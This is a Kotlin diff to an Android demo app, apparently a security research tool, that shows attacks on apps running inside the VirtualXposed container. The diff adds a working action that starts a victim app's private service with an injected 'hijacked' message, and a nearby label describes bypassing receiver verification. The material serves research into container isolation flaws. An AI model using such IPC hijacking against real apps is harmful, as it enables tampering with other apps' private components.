@@ -2,7 +2,9 @@ package com.virtualxposed.guestattacker
 
 import android.annotation.SuppressLint
 import android.app.ActivityManager
+import android.content.ComponentName
 import android.content.Intent
+import android.os.Build
 import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -202,7 +204,30 @@ class MainActivity : ComponentActivity() {
                             DemoCategory.IPC
                         ) {
                             IPC.messageVictimApp(this)
-                        }, DemoAction(
+                        },
+                        DemoAction(
+                            "IPC lifecycle abuse",
+                            "Start the private service of the Victim app with a malicious start message.",
+                            DemoCategory.IPC
+                        ) {
+                            val intent = Intent().apply {
+                                this.setPackage(VICTIM_APP)
+                                this.putExtra("StartMessage", "Hijacked start message toast")
+                                this.setComponent(
+                                    ComponentName(
+                                        VICTIM_APP, "$VICTIM_APP.PrivateService"
+                                    )
+                                )
+                            }
+                            runCatching {
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                    startForegroundService(intent)
+                                } else {
+                                    startService(intent)
+                                }
+                            }.isSuccess
+                        },
+                        DemoAction(
                             "Bypass receiver verification",
                             "VirtualXposed registers all receivers as exported static broadcast receivers, with no caller verification. " +
                                     "To prevent malicious broadcasts rewrites intents and redirects them to the real receiver. " +
